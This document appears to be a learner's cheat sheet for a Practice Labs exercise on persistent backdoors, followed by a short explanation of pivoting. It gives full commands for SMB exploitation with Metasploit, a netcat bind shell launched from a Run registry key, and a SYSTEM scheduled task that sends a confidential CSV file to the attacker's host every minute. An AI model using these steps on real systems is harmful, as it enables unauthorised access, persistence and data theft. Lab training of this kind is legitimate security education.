 # cheat sheet on creating persistent backdoors. 

1. click the Metasploit Framework icon on the desktop. In the terminal    window displayed, run the command:

> msfconsole

> press enter

> after it has created and initialized the database, you should see the  msf prompt.


2. you will use the psexec module in this case. To do this, type the fo   llowing command:

> use exploit/windows/smb/ms17_010_psexec

> press enter

3. next, set the remote host that you want to exploit. Type the following command:

> set RHOST 192.168.0.5

> press enter

4. Now set the username that you want to use to connect to the remote h   ost. Type the following command:

> set SMBUser admin

> Press Enter

5. clear the screen by pressing Ctrl+L

> After setting the username, you need to use the password for the same account. Type the following command:

> set SMBPass Passw0rd

> Press Enter.

6. Next, you will run the exploit to gain access to the remote system.    Type the following command:

> run

> press enter

7. The metepreter session with the remote system is now established

8. You will now send a backdoor to the remote system. To do this, type    the following command:

> upload /usr/share/windows-binaries/nc.exe C:\\Windows

> press enter


9. notice that the file is now uploaded to the C:\Windows directory on the remote host.


10.  Next, you need to enumerate the registry keys. Type the following      command:

> reg enumkey -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

> now, roll down the window... 
  enter, dude press enter. its amazing i have to keep putting it but if  i dont god knows you'll bitch and complain later lol. ok i'm done bei  ng a brat! haha


11.  Press Ctrl + l to clear the screen.

> The registry keys are now enumerated. Now, set the nc.exe to start on  Windows startup. Type the following command:

> reg setval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v nc -d ‘C:\Windows\nc.exe -l -p 1234 -e cmd.exe’

> Press Enter

12. ress Ctrl + l to clear the screen. The registry key was set successfully.

> To verify this, type the following command:

> reg queryval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\R  un -v nc

> press enter

> notice that the registry key values are displayed. this means that th  e registry key was added successfully.

13. press enter


> minimize the window to reach the desktop. Open another Terminal Windo  w.

> On the new terminal window displayed, start the Netcat listener. Type the following command:

> nc -v 192.168.0.5 1234

> Press Enter


!!!!! Alert notice that you have gained access to the Windows prompt.
Note: It is quite likely that you will be prompted with Connection Refused error. Connect to PLABWIN810 and keep its window open. You should then be able to run this command.!!!!!!!!!!!!


==================  Switch!!!! =================

should be switching from PLABKALI01 to PLABWIN810


1. Minimize the nc.exe window. Right-click the Windows charm and select   Run.

2. In the Run dialog box, in the Open textbox, type notepad and click
   OK

3. The Notepad window is displayed. type the following text: 

James 1234567890

Ron 0987654321

4. Click File and then select Save As

5. From the left pane, expand This PC and select Local Disk (C:). In th   e File name textbox, type the following:

> plab.csv

> from the save as type drop-down, select All Files and click Save.

> close the plab.csv file.

================== SWITCH !!!!!!!!================================
''
should be moving from PLABWIN810 to PLABKALI01
''


1. Connect back to PLABKALI01. In the terminal window, type the followi   ng command:

> whoami

> Press Enter

> notice that you have the domain administrator access

2. you need to close the Netcat session now. Press Ctrl + c 

3. you need to create a Netcat listener now to get hold of the plab.csv   file, which is a confidential file.

Clear the screen with the clear command. Type the following command:

$ cat > task.bat

> Press Enter

4. Avnew file has been created. Type the following commands:
''
 notice that each command is its own. press enter after each
 individual command

''

> @echo off 

> C:\Windows\nc.exe -w 3 

> 192.168.0.3 1234 < C:\plab.csv

> remember to press enter after each command executes 

> save and exit the file, press Ctrl + z.

5. Next you will create a scheduled task on the remote system to run th   e Netcat listener.

> To do this, bring the msf5 prompt window in front and type the follow  ing command:

> run

> Press Enter. You are back at the meterpreter prompt.

6. You need to upload the task.bat file to the remote system. To do thi   s, type the following command:

> upload /root/task.bat C:\\Windows

> press enter

> notice that the file is uploaded to the remote system.

>  press Ctrl + l to clear the screen.

  Next, you will create a scheduled task to run the batch file that you  had created. Type the following command:

> execute -f ‘schtasks /create /tn plabtask /tr C:\Windows\task.bat /sc minute /mo 1 /ru system’

> press enter

> notice the task has been created 



==================== SWITCH!!!!! ==============================





7.  Within the PLABKALI01 system, switch to the other terminal window and type the following command:

> nc -l -p 1234 > plab.csv

> Press Enter.

> The netcat listener has started.
Note: You will need to wait for one minute. 

2. Clear the screen with the clear command.

> Notice that the nc command completes. To view the contents of the fil  e, type the following command:

> cat plab.csv

> Press Enter

> notice that both the contacts are listed

==================== SWITCH!!!! ======================
 should be switching from PLABKALI01 to PLABWIN810


1. switch to PLABWIN810. Open the plab.csv file and make the following entry:

> Harry 2345678901

> save and close the file.

=========== SWITCH !!! ======

should be going from PLABWIN810 to PLABKALI01.

1. you need to run the Netcat listener again. Type the following command:

> nc -l -p 1234 > plab.csv

> Press Enter.

Note: As before, you will need to wait for one minute.

2. you are returned to the prompt after one minute. Now, verify if   the contents have been updated on your system. Run the followin   g command:

> cat plab.csv

> Press Enter

> Notice that the new entry that you made has also been updated. R  emember that every time that file is updated, you can run the Ne  tcat listener and get the updated details.

============= The end ==============

for the encore this evening i would like to give you a brief explanation on pivoting. enjoy..


- Explain Pivoting

> Pivoting is similar to lateral movement, as both the tasks take place after you exploit a host. In a lateral movement, you move from one host to another host and look for more vulnerabilities to exploit. 

> In pivoting, you exploit the vulnerabilities in one host, and then you explore the options of exploiting a host and then make a move to the other hosts that are connected with the first. 

> These hosts would possibly be not accessible otherwise. These hosts are typically located on a different subnet and, therefore, are difficult to reach without direct access.


> In the given example, the attacker is located on 81 subnet, but the target systems that the attacker wants to exploit are located on 63 subnets. If there is a direct attempt made to connect with these hosts, the firewall in between blocks the connection. Therefore, the attacker is prevented from proceeding further.

> The attacker, however, then targets the Webserver, which is located on the same subnet as his own system. The Webserver has the connectivity to the 63 subnet, and therefore, for the attacker, it would be easy to target the Webserver. If SSH is enabled on the Webserver, then it makes the job easier for the attacker.

> After exploiting the Webserver, the attacker can then perform the lateral movement by forwarding the connections from the Webserver to the systems on the 63 subnet. The attacker, even though blocked by the firewall, can now reach the systems on 63 subnet.

> Pivoting can be of different types:

> Port Forwarding

> This is one of the most widely used methods in which the attacke  r finds an open port on the exploited host and then uses it to f  orward traffic to the target system.

> SSH Pivoting

> SSH is used in this method. You need to setup a local proxy and   also enable port forwarding. The connections that are made to th  e port using the specified port, they are forwarded to the end t  arget.

> Routing Table Pivoting

When you exploit a host, you can make changes to its routing table. Along with this, you can set the gateway as the exploit session. When this is done, the traffic must pass through the gateway to reach the destination.

VPN pivoting can also be performed even though it is mostly used for the reconnaissance of a network.

